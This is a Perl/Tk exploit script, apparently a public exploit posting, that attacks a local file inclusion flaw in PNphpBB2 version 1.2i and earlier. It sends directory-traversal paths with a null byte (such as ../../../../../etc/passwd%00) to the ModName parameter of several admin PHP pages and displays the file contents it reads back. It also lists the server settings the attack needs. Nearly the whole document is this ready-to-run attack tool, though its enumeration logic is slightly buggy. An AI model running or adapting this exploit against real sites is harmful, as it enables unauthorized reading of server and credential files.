PNphpBB2 <= 1.2i (ModName) Multiple Local File Inclusion Exploit
================================================================


#!/usr/bin/perl
# PNphpBB2 <= 1.2i (ModName) Multiple LFI Exploit
# by athos - staker

use strict;
use LWP::Simple;
use Tk;

my ($host,$file,$about);

my $poc = "PNphpBB2 <= 1.2i (ModName) Multiple LFI Exploit";
my $obj = new MainWindow(-background => &#039;#E4E4E4&#039;);

$obj->title($poc);
$obj->minsize(500,200);
$obj->maxsize(500,200);

text(&#039;Host/Path (ex: http://localhost/cms)&#039;);
input1();
text(&#039;Local File (ex: ../../../../../etc/passwd&#039;);
input2();
button();
Button();

print $host;

sub text {
   
   my $load = undef;
   my $text = shift;
   
   $load = $obj->Label(
                  -text  => $text,
                  -font  => &#039;monospace 8&#039;,
                  -foreground   => &#039;#000000&#039;,
                  -background   => &#039;#E4E4E4&#039;,
                )->pack(-anchor => &#039;n&#039;);
   return $load;           
}


sub input1 {
   
   return $obj->Entry(
                  -textvariable => \$host,
                  -font         => &#039;monospace 8&#039;,
                  -foreground   => &#039;#000000&#039;,
                  -background   => &#039;#E4E4E4&#039;,
                  )->pack(-anchor => &#039;n&#039;);
   
}


sub input2 {
   
   return $obj->Entry(
                  -textvariable => \$file,
                  -font         => &#039;monospace 8&#039;,
                  -foreground   => &#039;#000000&#039;,
                  -background   => &#039;#E4E4E4&#039;,
                  )->pack(-anchor => &#039;n&#039;);
   
}

sub button {

   return $obj->Button(
                -text    => &#039;Exploit&#039;,
                -font    => &#039;monospace 8&#039;,
                -foreground   => &#039;#000000&#039;,
                -background   => &#039;#E4E4E4&#039;,
                -command => sub { exploit(); }
               )->pack(-anchor => &#039;n&#039;);
}

sub Button {
   
   return $obj->Button(
                -text    => &#039;Credits&#039;,
                -font    => &#039;monospace 8&#039;,
                -foreground   => &#039;#000000&#039;,
                -background   => &#039;#E4E4E4&#039;,
                -command => sub { about(); }
               )->pack(-anchor => &#039;n&#039;);
}

sub exploit {
   
   my $enum = 0;
   my @path = (
             &#039;/admin/admin_words.php?ModName=&#039;,
             &#039;/admin/admin_groups_reapir.php?ModName=&#039;,
             &#039;/admin/admin_smilies.php?ModName=&#039;,
             &#039;/admin/admin_ranks.php?ModName=&#039;,
             &#039;/admin/admin_styles.php?ModName=&#039;,
             &#039;/admin/admin_users.php?ModName=&#039;,
           );  
   
   if(get($path[$enum]) =~ /no such file/i) {
      $enum++;
   }
   else {
      window(get($host.$path[$enum].$file.&#039;%00&#039;));
   }            
}


sub window {
   
   my $A = shift;
   my $T = new MainWindow(-background => &#039;#E4E4E4&#039;);
   
   $T->title(&#039;Exploit Content&#039;);
   
   return $T->Label(
              -text       => $A,
              -font       => &#039;monospace 8&#039;,
              -background => &#039;#E4E4E4&#039;,
              -foreground => &#039;#000000&#039;,
            )->pack(-anchor => &#039;n&#039;);  
}            

sub about {
   
   $about .= $poc;
   $about .= "\nby athos - staker[at]hotmail[dot]it\r";
   $about .= "\ndownload on http://www.pnphpbb.com\r";
   $about .= "\nregister globals  = 1\r";
   $about .= "\nmagic quotes gpc = 0\r\n";
   
   my $H = new MainWindow(-background => &#039;#E4E4E4&#039;);
   
   $H->title(&#039;About&#039;);
   $H->minsize(500,200);
   $H->maxsize(500,200);
   
   return $H->Label(
              -text       => $about,
              -font       => &#039;monospace 8&#039;,
              -background => &#039;#E4E4E4&#039;,
              -foreground => &#039;#000000&#039;,
            )->pack(-anchor => &#039;n&#039;);
}



MainLoop;




